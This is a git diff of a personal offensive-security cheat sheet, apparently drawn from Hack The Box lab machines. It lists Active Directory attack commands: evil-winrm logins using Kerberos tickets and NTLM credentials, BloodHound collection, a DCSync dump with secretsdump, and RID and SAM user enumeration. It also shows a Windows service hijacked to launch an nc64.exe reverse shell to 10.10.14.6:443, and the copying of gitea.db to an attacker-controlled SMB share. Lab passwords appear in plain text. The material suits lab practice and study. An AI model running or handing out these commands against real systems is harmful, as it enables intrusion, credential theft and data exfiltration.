@@ -1,69 +1,76 @@
 ___
 
 
+*Connecting with evil-winrm with KRB ticket*
 
-*connecting with evil-winrm with KRB ticket*
+*This worked for win-rm* -> this has to be the ugliest command I have ever written
 
-*this worked for win-rm* -> this has to b the most ugly command I have ever written
-
-KRB5CCNAME=./svc_winrm.ccache sudo docker run --rm -it -v "/home/ew/box/Voleur/svc_winrm.ccache:/tmp/krb5cc_0" -v "/home/ew/box/Voleur/krb5.conf:/etc/krb5.conf" -v "/etc/hosts:/etc/hosts:ro" evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB 
+```
+KRB5CCNAME=./svc_winrm.ccache sudo docker run --rm -it -v "./svc_winrm.ccache:/tmp/krb5cc_0" -v "./krb5.conf:/etc/krb5.conf" -v "/etc/hosts:/etc/hosts:ro" evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB 
+```
 
 
  *NTLM authentication*
-sudo docker run --rm -it evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' 
+ ```
+ sudo docker run --rm -it evil-winrm -i 10.10.11.108 -u 'svc-printer' -p 'password123' 
+ ```
 
 
-are you using kerberos or NTLM authention? pay attention the commands may change
+Note
+---
+Are you using Kerberos or NTLM authentication? Pay attention the commands may change!
 
 
-*generating TGT for user*
+*Generating TGT for user*
+```
 nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' --generate-tgt f.frizzle
+```
 
-
-
-*grabbing bloodhound info*
+*Grabbing bloodhound info*
+```
 bloodhound-python -u 'svc-printer' -p '1edFg43012!!' -ns 10.10.11.108 -dc printer.return.local -d return.local -c All  
+```
 
-
-
-*start neo4j*
+*Starting Bloodhound (neo4j needs to be running)*
+```
+start neo4j
 sudo neo4j console
+```
 
-
-
-**getST.py**
-**ntlmrelayx.py**
-**secretsdump.py**
-
+*Useful Impacket Scripts*
+```
+getST.py
+ntlmrelayx.py
+secretsdump.py
+```
 
 *DCsync attack*
-secretsdump.py 'puppy.htb'/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.180 
-
-
-
-*rpcclient guest with no password*
-rpcclient 10.10.11.108 -U 'guest%' 
-
-rpcclient $> lookupnames administrator
-
-
-`lookupsids`
-
-lookupsid.py svc-printer@10.10.11.108
-
 ```
+secretsdump.py 'puppy.htb'/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.180 
+```
+
+*Rpcclient guest with no password*
+```
+rpcclient 10.10.11.108 -U 'guest%' 
+rpcclient $> lookupnames administrator
+```
+
+*Lookupsids*
+```
+lookupsid.py svc-printer@10.10.11.108
+or
 netexec smb 10.10.11.222 -u guest -p '' --rid-brute
 ```
 
 
-*uses SAM remote interface to enumerate users, works over smb/RPC*
-`samrdump.py`
-
+*Uses SAM remote interface to enumerate users, works over smb/RPC*
+```
 samrdump.py return.local/svc-printer:'1edFg43012!!'@10.10.11.108 
-
+```
 
 
 *powershell/cmd enumeration*
+--
 whoami /priv
 whoami /groups
 
@@ -75,46 +82,51 @@ sc.exe query -> list running services
 ```
 
 
+*Services*
+---
 
-*copy docker files in and out of container*
-sudo docker cp 245f71c07597:/data/site-backup-2024-12-30.zip /home/ew/box/puppy/loot/site-backup-2024-12-30.zip
-
-
-
-*adding a service*
+*Adding a service*
 ```
 sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
 ```
 
-*running service on attacker machine*
+*Running service on attacker machine*
 ```
 sc.exe start VSS
 ```
 
 
+*Exfil*
+---
 
-*all open ports*
+*List all open ports*
+```
 netstat -a 
+```
 
+*Copy docker files in and out of container*
+```
+sudo docker cp 245f71c07597:/data/site-backup-2024-12-30.zip ./loot/site-backup-2024-12-30.zip
+```
 
-
-*start smb server for file transfer from windows*
+*Start smb server for file transfer from windows*
 ```
 smbserver.py share . -username 0xdf -password 0xdf -smb2support
 ```
 
- *use share*
+ *Use share*
 ```
 net use \\10.10.14.6\share /u:0xdf 0xdf
 ```
-
-
 
 *copy to share*
 ```
 copy data\gitea.db //10.10.14.6/share/
 ```
 ``
+
+*Extras*
+---
 
 *RunAs.exe command*
 ```
